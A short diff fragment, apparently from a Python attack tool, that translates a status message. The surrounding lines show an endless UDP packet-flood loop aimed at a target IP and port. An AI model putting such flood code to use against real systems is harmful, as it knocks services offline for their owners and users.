@@ -202,7 +202,7 @@ if(tool == "4"):
   while True:
    sock.sendto(bytes, (hedef_ip, hedef_port))
    sayac += 1
-   print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))
+   print("\033[92mATTACKİNG , sended:::%s\033[0m" % (sayac))
    
 
 elif(tool == "5"):
